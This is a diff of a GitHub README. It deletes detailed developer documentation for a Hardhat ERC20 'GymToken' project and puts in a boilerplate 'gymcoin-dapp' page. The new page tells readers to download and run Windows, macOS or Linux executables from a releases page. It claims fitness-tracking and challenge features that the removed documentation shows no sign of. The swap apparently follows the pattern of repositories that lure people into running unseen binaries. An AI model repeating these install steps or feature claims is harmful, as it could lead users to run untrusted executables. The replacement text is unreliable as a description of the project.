@@ -1,392 +1,67 @@
-<p align="center">
-  <img src="./videos/Cryptocurrency_Token_Reveal_Animation.gif" alt="Gym Coin Intro" width="600" height="350" />
-</p>
+# 🚀 gymcoin-dapp - A Seamless Fitness Economy Experience
 
-# GymToken - ERC20 Token Project
+## 🛠️ Features
+- **Blockchain Integration:** Secure transactions using blockchain technology.
+- **Decentralized Application (dApp):** Access fitness services without middlemen.
+- **ERC20 Token Support:** Earn and use Gymcoin tokens within the app.
+- **User-Friendly Interface:** Easy navigation for anyone, regardless of skill level.
+- **Real-Time Updates:** Instant data synchronization for a smooth experience.
 
-A Hardhat-based Ethereum project for deploying and managing the **GymToken** (GYM), a standard ERC20 token built with OpenZeppelin contracts.
+## 📥 Download Now
+![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-brightgreen)
 
-## 📋 Project Overview
-
-This project demonstrates:
-
-- **ERC20 Token Implementation**: A complete token contract using OpenZeppelin standards
-- **Hardhat Development Environment**: Modern Ethereum development toolkit
-- **TypeScript Integration**: Type-safe smart contract interactions
-- **Multiple Solidity Compiler Support**: Configured for different Solidity versions
-- **Easy Deployment Scripts**: Automated deployment with detailed logging
-
-## 🏗️ Project Structure
-
-```
-mytoken/
-├── contracts/
-│   ├── Token.sol           # GymToken ERC20 contract
-│   ├── Counter.sol         # Example counter contract
-│   └── Counter.t.sol.bak   # Foundry test file (backup)
-├── scripts/
-│   ├── deploy.ts          # Main deployment script
-│   └── send-op-tx.ts      # OP transaction example
-├── ignition/
-│   └── modules/
-│       └── Counter.ts     # Ignition deployment module
-├── test/
-│   └── Counter.ts         # Test files
-├── hardhat.config.ts      # Hardhat configuration
-└── package.json          # Dependencies and scripts
-```
-
-## 🪙 GymToken Contract Details
-
-- **Name**: Gym Token
-- **Symbol**: GYM
-- **Standard**: ERC20 (OpenZeppelin implementation)
-- **Initial Supply**: 1,000,000,000 GYM (1 billion tokens)
-- **Decimals**: 18 (standard)
-- **Features**:
-  - Transfer functionality
-  - Allowance system
-  - Minting at deployment
-  - Standard ERC20 events
+Visit this page to download: [Releases Page](https://github.com/mwaila/gymcoin-dapp/releases)
 
 ## 🚀 Getting Started
+To get started with gymcoin-dapp, follow these simple steps:
 
-### Prerequisites
+1. **Visit the Releases Page**  
+   Click this link to go to the [Releases Page](https://github.com/mwaila/gymcoin-dapp/releases).
 
-- **Node.js** (v16 or higher)
-- **npm** or **yarn**
-- **Git**
+2. **Choose the Latest Version**  
+   On the releases page, find the latest version of gymcoin-dapp. The latest version will be listed at the top.
 
-### Installation
+3. **Download the Software**  
+   Click on the version you want and choose the appropriate file for your operating system (Windows, macOS, or Linux).
 
-1. **Clone the repository** (or navigate to your project directory):
+4. **Install the Application**  
+   Once the file finishes downloading, locate it in your downloads folder.  
+   - For Windows: Double-click the `.exe` file and follow the prompts.  
+   - For macOS: Open the `.dmg` file, drag the app into your Applications folder.  
+   - For Linux: Open the terminal and type `chmod +x filename` to make the file executable, then run it.
 
-```bash
-cd C:\Projectx\BlockChain\Ethereum\mytoken
-```
+5. **Set Up MetaMask**  
+   You will need MetaMask to interact with Ethereum. Download it from the official site and follow the setup instructions.  
 
-2. **Install dependencies**:
+6. **Launch the Application**  
+   Open gymcoin-dapp from your applications menu.  
 
-```bash
-npm install
-```
+7. **Create an Account**  
+   Follow the on-screen instructions to create your fitness account. You will be able to manage your Gymcoin tokens here.
 
-3. **Compile contracts**:
+## 💻 System Requirements
+- **Operating System:**  
+  - Windows 10 or later  
+  - macOS 10.14 or later  
+  - Any recent version of Linux
 
-```bash
-npx hardhat compile
-```
+- **Browser Compatibility:**  
+  - Firefox (latest version)  
+  - Chrome (latest version)  
+  - Brave
 
-## 🔧 Usage
+- **Internet Connection:**  
+  A stable internet connection is required for full functionality.
 
-### Compiling Contracts
+## ⚙️ How to Use gymcoin-dapp
+1. **Log In:** Enter your account details to log in.
+2. **Explore Features:** Check out the available fitness services and features.
+3. **Track Your Fitness Journey:** Use the app to log workouts and track progress.
+4. **Earn Gymcoin:** Participate in challenges to earn tokens you can spend on the platform.
 
-Compile all Solidity contracts:
+## 🥇 Getting Help
+If you encounter any issues, feel free to check the FAQs section on the releases page, or create an issue to report a problem. Engage with our community for tips and support.
 
-```bash
-npx hardhat compile
-```
+---
 
-### Deploying GymToken
-
-Deploy to local Hardhat network:
-
-```bash
-npx hardhat run scripts/deploy.ts --network hardhat
-```
-
-Deploy to Sepolia testnet:
-
-```bash
-npx hardhat run scripts/deploy.ts --network sepolia
-```
-
-The deployment script will:
-
-- Deploy GymToken with 1 billion initial supply
-- Mint all tokens to the deployer's address
-- Display the deployed contract address
-
-### Verifying on Etherscan
-
-Verify your contract on Etherscan for better transparency:
-
-```bash
-npx hardhat verify --network sepolia <CONTRACT_ADDRESS> 1000000000
-```
-
-Replace `<CONTRACT_ADDRESS>` with your deployed contract address.
-
-## 📝 Deployed Contracts
-
-### Sepolia Testnet
-
-- **Contract Address**: [0x5dbB770Daa57c7f345E1e55024F0f06247f89682](https://sepolia.etherscan.io/address/0x5dbB770Daa57c7f345E1e55024F0f06247f89682)
-- **Token Name**: Gym Token
-- **Symbol**: GYM
-- **Total Supply**: 1,000,000,000 GYM
-- **Deployed On**: June 2024
-- **Owner Address**: 0xdf4D45FbAa4EC85e5A19d8af327671B9B462EEcE
-
-## 💻 Interacting with GymToken
-
-### Using Etherscan
-
-You can interact with the verified contract directly on Etherscan:
-
-1. Visit the contract page on [Sepolia Etherscan](https://sepolia.etherscan.io/address/0x5dbB770Daa57c7f345E1e55024F0f06247f89682)
-2. Go to the "Contract" tab and select "Read Contract" to view token information
-3. Go to "Write Contract" to interact with functions like `transfer`, `approve`, etc.
-
-### Using Hardhat Scripts
-
-Create custom scripts for specific interactions. For example, to check your token balance:
-
-```typescript
-// scripts/checkBalance.ts
-const hre = require("hardhat");
-
-async function main() {
-  const tokenAddress = "0x5dbB770Daa57c7f345E1e55024F0f06247f89682";
-  const accountToCheck = "YOUR_ADDRESS_HERE";
-
-  const token = await hre.ethers.getContractAt("GymToken", tokenAddress);
-  const balance = await token.balanceOf(accountToCheck);
-
-  console.log(`GYM Token Balance: ${hre.ethers.formatUnits(balance, 18)} GYM`);
-}
-
-main().catch((error) => {
-  console.error(error);
-  process.exitCode = 1;
-});
-```
-
-Run the script with:
-
-```bash
-npx hardhat run scripts/checkBalance.ts --network sepolia
-```
-
-## 🔍 Testing RPC Endpoints
-
-If you experience RPC connection issues, you can test multiple endpoints with the provided script:
-
-```bash
-npx ts-node scripts/findWorkingRpc.ts
-```
-
-This script will:
-
-````bash
-
-1. Test the configured RPC endpoint in your `.env` file
-2. Try alternative endpoints if the configured one fails
-3. Update your `.env` file with a working endpoint
-4. Check your wallet balance
-
-## ⚠️ Troubleshooting
-
-### Common Issues
-
-#### RPC Connection Problems
-
-```plaintext
-Error: could not detect network (event="noNetwork", code=NETWORK_ERROR, version=providers/5.7.2)
-````
-
-**Solution**:
-
-- Try changing the RPC URL in your `.env` file
-- Run `npx ts-node scripts/findWorkingRpc.ts` to find a working endpoint
-- Increase the timeout in your `hardhat.config.ts` file
-
-#### Insufficient Funds
-
-```plaintext
-Error: insufficient funds for intrinsic transaction cost
-```
-
-**Solution**:
-
-- Get testnet ETH from a Sepolia faucet
-- Check your balance with `npx hardhat run scripts/checkBalance.ts --network sepolia`
-
-#### Contract Verification Failed
-
-```plaintext
-The constructor arguments don't match
-```
-
-**Solution**:
-
-- Ensure you're passing the correct constructor arguments
-- For GymToken: `npx hardhat verify --network sepolia <CONTRACT_ADDRESS> 1000000000`
-
-```
-✅ GymToken deployed at: 0x5FbDB2315678afecb367f032d93F642f64180aa3
-```
-
-### Testing Deployment
-
-You can interact with the deployed contract using Hardhat console:
-
-```bash
-npx hardhat console --network hardhat
-```
-
-Example interactions:
-
-```javascript
-// Get contract factory
-const Token = await ethers.getContractFactory("GymToken");
-
-// Connect to deployed contract (replace with actual address)
-const token = await Token.attach("0x5FbDB2315678afecb367f032d93F642f64180aa3");
-
-// Check token details
-await token.name(); // "Gym Token"
-await token.symbol(); // "GYM"
-await token.totalSupply(); // 1000000000000000000000000000 (1B * 10^18)
-```
-
-## 🌐 Network Configuration
-
-The project is configured to work with multiple networks. Currently set up for:
-
-- **Hardhat Network**: Local development network (default)
-- **Localhost**: Local Ethereum node (port 8545)
-
-### Adding New Networks
-
-To add testnets or mainnet, update `hardhat.config.ts`:
-
-```typescript
-networks: {
-  sepolia: {
-    url: "https://sepolia.infura.io/v3/YOUR-PROJECT-ID",
-    accounts: ["YOUR-PRIVATE-KEY"]
-  }
-}
-```
-
-Then deploy with:
-
-```bash
-npx hardhat run scripts/deploy.ts --network sepolia
-```
-
-## 📝 Smart Contract Details
-
-### GymToken.sol
-
-```solidity
-contract GymToken is ERC20 {
-    constructor(uint256 initialSupply) ERC20("Gym Token", "GYM") {
-        _mint(msg.sender, initialSupply * 10 ** decimals());
-    }
-}
-```
-
-**Key Features:**
-
-- Inherits from OpenZeppelin's ERC20 implementation
-- Mints entire supply to contract deployer
-- No additional minting functionality (fixed supply)
-- Standard transfer and approval mechanisms
-
-### Deployment Parameters
-
-- **Initial Supply**: 1,000,000,000 tokens (specified in deploy.ts)
-- **Deployed to**: Contract deployer's address
-- **Gas Optimization**: Compiler optimization enabled
-
-## 🧪 Development Workflow
-
-### 1. Make Contract Changes
-
-Edit `contracts/Token.sol` for any modifications
-
-### 2. Compile & Check
-
-```bash
-npx hardhat compile
-```
-
-### 3. Deploy & Test
-
-```bash
-npx hardhat run scripts/deploy.ts --network hardhat
-```
-
-### 4. Verify Deployment
-
-Use Hardhat console or create test scripts to interact with your contract
-
-## 🛠️ Customization
-
-### Changing Token Parameters
-
-Edit `contracts/Token.sol`:
-
-```solidity
-constructor(uint256 initialSupply) ERC20("Your Token Name", "SYMBOL") {
-    _mint(msg.sender, initialSupply * 10 ** decimals());
-}
-```
-
-### Modifying Supply
-
-Edit `scripts/deploy.ts`:
-
-```typescript
-const initialSupply = 5000000000; // 5 billion tokens
-```
-
-### Adding Features
-
-Consider adding:
-
-- **Minting**: Allow new token creation
-- **Burning**: Token destruction functionality
-- **Pausing**: Emergency stop functionality
-- **Access Control**: Admin roles and permissions
-
-## 📚 Dependencies
-
-- **@openzeppelin/contracts**: Secure, audited smart contract library
-- **hardhat**: Development environment and task runner
-- **ethers**: Ethereum library for JavaScript/TypeScript
-- **typescript**: Type safety and modern JavaScript features
-
-## 🔍 Troubleshooting
-
-### Common Issues
-
-**1. Compilation Errors**
-
-```bash
-npx hardhat clean
-npx hardhat compile
-```
-
-**2. Deployment Failures**
-
-- Check network connectivity
-- Ensure sufficient ETH for gas fees
-- Verify contract constructor parameters
-
-**3. Type Errors**
-
-- Ensure TypeScript dependencies are installed
-- Check import paths and contract names
-
-### Getting Help
-
-- Check [Hardhat Documentation](https://hardhat.org/docs)
-- Review [OpenZeppelin Docs](https://docs.openzeppelin.com/)
-- Examine error messages carefully
-
-## 📄 License
-
-This project is licensed under the ISC License.
+Feel free to follow these steps to enjoy the benefits of gymcoin-dapp and join our fitness community powered by blockchain technology.
